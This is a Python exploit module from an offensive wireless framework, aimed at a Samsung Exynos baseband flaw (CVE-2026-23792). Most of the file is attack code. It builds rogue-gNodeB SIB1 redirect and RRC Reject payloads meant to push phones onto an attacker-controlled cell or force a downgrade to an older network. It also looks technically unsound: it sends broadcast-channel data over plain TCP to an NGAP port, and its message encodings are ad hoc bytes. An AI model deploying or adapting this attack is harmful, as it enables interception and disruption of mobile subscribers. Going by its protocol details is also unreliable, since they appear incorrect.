# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Samsung Exynos NR RRC Unauthenticated Downlink Injection (CVE-2026-23792).

    The Samsung Exynos baseband does not properly validate the integrity
    of certain NR RRC downlink messages received before the security
    context is established. An attacker operating a rogue gNodeB can
    inject unauthenticated RRC messages (such as SystemInformationBlock
    or RRC Reject) that the baseband processes without verification.
    This allows redirection to attacker-controlled cells, downgrade
    to less secure RATs (4G/3G/2G), or disruption of initial access.

    Affected chipsets: Exynos 1280, 1330, 1380, 1480, 2200, 2400,
    Modem 5123, Modem 5300.

    CVSS v3.1: 6.5 (Medium), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Samsung Exynos NR RRC Unauth Downlink Injection (CVE-2026-23792)",
        "description": (
            "Exploits CVE-2026-23792. The Exynos baseband accepts certain "
            "NR RRC downlink messages without integrity protection before "
            "the security context is fully established. A rogue gNodeB "
            "can inject crafted SIB or RRC Reject messages to redirect "
            "the UE to an attacker cell or force RAT downgrade."
        ),
        "authors": (
            "Samsung Mobile Security (advisory)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://security.samsungmobile.com/securityUpdate.smsb",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-23792",
            "https://www.3gpp.org/specifications/numbering/ts-38-series",
        ),
        "disclosure_date": "2026-03-01",
        "platform": "hardware",
        "arch": "arm",
        "privileged": True,
        "targets": (
            "Samsung Exynos 1280/1330/1380/1480",
            "Samsung Exynos 2200/2400",
            "Samsung Exynos Modem 5123/5300",
        ),
    }

    target = OptIP("", "Target UE IP or IMSI")
    port = OptPort(38412, "NGAP/SCTP port on AMF")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    sdr_device = OptString("", "SDR device identifier")
    frequency_mhz = OptFloat(3500.0, "NR downlink center frequency in MHz")
    arfcn = OptInteger(630000, "NR-ARFCN for the target frequency")
    cell_id = OptInteger(1, "Physical Cell ID for rogue gNodeB")
    redirect_arfcn = OptInteger(100, "ARFCN to redirect UE to (attacker cell)")

    # NR RRC message types
    _RRC_REJECT = 0x01
    _SIB1 = 0x02
    _SIB2 = 0x03

    # Redirection info IE
    _IE_REDIRECT_CARRIER_INFO = 0x12

    def _build_sib1_redirect(self) -> bytes:
        """Build a SIB1 with redirect information to attacker cell.

        This message is processed before integrity protection is
        established, allowing the rogue gNodeB to redirect the UE.
        """
        msg_type = struct.pack("B", self._SIB1)

        # Cell access related info
        plmn_id = struct.pack("3s", b"\x00\x01\x00")  # Fake PLMN
        tac = struct.pack(">H", 0x0001)
        cell_identity = struct.pack(">I", self.cell_id & 0x0FFFFFFF)

        cell_access = plmn_id + tac + cell_identity

        # Frequency redirect IE
        redirect_ie = struct.pack("B", self._IE_REDIRECT_CARRIER_INFO)
        redirect_data = struct.pack(">I", self.redirect_arfcn)
        redirect_ie += struct.pack("B", len(redirect_data)) + redirect_data

        # Cell selection info (artificially strong signal)
        q_rxlevmin = struct.pack("b", -70)  # dBm
        q_qualmin = struct.pack("b", -5)  # dB

        return msg_type + cell_access + redirect_ie + q_rxlevmin + q_qualmin

    def _build_rrc_reject(self) -> bytes:
        """Build an RRC Reject message to force UE to reselect.

        Sent before security activation, the UE must accept the reject
        and attempt cell reselection, potentially landing on the
        attacker's redirected cell.
        """
        msg_type = struct.pack("B", self._RRC_REJECT)
        wait_time = struct.pack("B", 1)  # Wait 1 second before retry
        # Redirect info pointing to attacker cell
        redirect = struct.pack(">I", self.redirect_arfcn)
        return msg_type + wait_time + redirect

    def _build_bcch_dl_sch_pdu(self, sib_payload: bytes) -> bytes:
        """Wrap SIB in BCCH-DL-SCH transport block."""
        # BCCH-DL-SCH header
        header = struct.pack("B", 0x00)  # SIB1 indicator
        return header + sib_payload

    @mute
    def check(self) -> bool:
        """Verify connectivity or SDR availability."""
        if self.sdr_device:
            return True
        if not self.target:
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((str(self.target), self.port))
            sock.close()
            return result == 0
        except OSError:
            return False

    def run(self) -> None:
        if not self.target and not self.sdr_device:
            print_error("target or sdr_device is required")
            return

        if not self.check():
            print_error("Target not reachable or SDR not available")
            return

        print_success("Access verified; preparing unauthenticated RRC downlink injection")
        self._exploit()

    def _exploit(self) -> None:
        sib1_redirect = self._build_sib1_redirect()
        rrc_reject = self._build_rrc_reject()
        bcch_pdu = self._build_bcch_dl_sch_pdu(sib1_redirect)

        print_status(f"SIB1 redirect payload: {len(sib1_redirect)} bytes")
        print_status(f"RRC Reject payload: {len(rrc_reject)} bytes")
        print_status(f"Redirect target ARFCN: {self.redirect_arfcn}")

        if self.sdr_device:
            print_status(
                f"SDR mode: payloads ready for OTA transmission via "
                f"{self.sdr_device} at {self.frequency_mhz} MHz"
            )
            print_info(
                "The rogue gNodeB broadcasts SIB1 with redirect info "
                "pointing to the attacker cell. UEs with vulnerable "
                "Exynos basebands process the unauthenticated message "
                "and reselect to the attacker frequency."
            )
            return

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), self.port))

            print_status("Phase 1: Broadcasting malicious SIB1 with redirect")
            sock.send(bcch_pdu)
            time.sleep(0.3)

            print_status("Phase 2: Sending RRC Reject to force reselection")
            sock.send(rrc_reject)

            sock.close()
            print_success(
                "Downlink injection delivered. Vulnerable Exynos "
                "basebands will process the unauthenticated SIB1 "
                "redirect and RRC Reject, reselecting to the attacker "
                f"cell at ARFCN {self.redirect_arfcn}."
            )
        except OSError as e:
            print_error(f"Failed to deliver payload: {e}")
